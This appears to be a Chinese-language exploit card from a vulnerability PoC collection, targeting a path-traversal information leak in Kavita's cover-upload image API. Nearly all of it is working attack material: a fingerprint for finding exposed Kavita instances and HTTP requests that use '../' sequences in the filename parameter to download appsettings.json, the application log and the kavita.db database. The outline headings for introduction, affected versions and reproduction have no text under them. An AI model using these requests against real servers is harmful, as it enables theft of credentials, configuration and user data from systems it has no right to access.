# Kavitacover-upload存在敏感信息泄露漏洞

- **系统**：Kavitacover　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="Kavita"`
- **请求**：`GET /api/image/cover-upload?filename=../appsettings.json HTTP/2`
- **关键头**：`Sec-Fetch-User: ?1`

**请求体 / payload**
```
GET /api/image/cover-upload?filename=../../config//logs/kavita.log HTTP/2
Host:
Sec-Fetch-User: ?1
/api/image/cover-upload?filename=../../config/kavita.db
```

**其他**
- Kavita cover-upload存在敏感信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Kavita